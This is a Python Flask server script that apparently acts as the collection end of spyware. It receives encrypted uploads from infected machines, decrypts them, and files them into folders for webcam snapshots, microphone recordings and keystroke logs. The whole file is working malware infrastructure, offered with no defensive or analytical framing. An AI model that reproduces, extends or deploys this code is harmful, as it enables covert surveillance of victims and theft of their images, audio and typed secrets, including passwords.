from flask import Flask, request
import os
import uuid
from decryptor import decrypt_file

app = Flask(__name__)

os.makedirs("received", exist_ok=True)
os.makedirs("static/cam", exist_ok=True)
os.makedirs("static/mic", exist_ok=True)
os.makedirs("static/keylogs", exist_ok=True)

@app.route("/upload", methods=["POST"])
def upload():
    uploaded_file = request.files["file"]

    # Save encrypted file
    enc_filename = f"{uuid.uuid4().hex}.enc"
    enc_path = f"received/{enc_filename}"
    uploaded_file.save(enc_path)

    # Decrypt
    try:
        # Heuristic: look at first 4 bytes of decrypted content to guess file type
        temp_decrypted_path = f"received/tmp_{uuid.uuid4().hex}"
        decrypt_file(enc_path, temp_decrypted_path)

        with open(temp_decrypted_path, "rb") as f:
            sig = f.read(4)

        if sig.startswith(b"\xff\xd8\xff"):  # JPEG
            out_path = f"static/cam/{uuid.uuid4().hex}.jpg"
        elif sig.startswith(b"RIFF"):        # WAV
            out_path = f"static/mic/{uuid.uuid4().hex}.wav"
        else:                                # Fallback: assume text
            out_path = f"static/keylogs/{uuid.uuid4().hex}.txt"

        decrypt_file(enc_path, out_path)
        os.remove(temp_decrypted_path)

        return "Decrypted and saved", 200

    except Exception as e:
        return f"Decryption failed: {e}", 500

if __name__ == "__main__":
    app.run(port=5000)
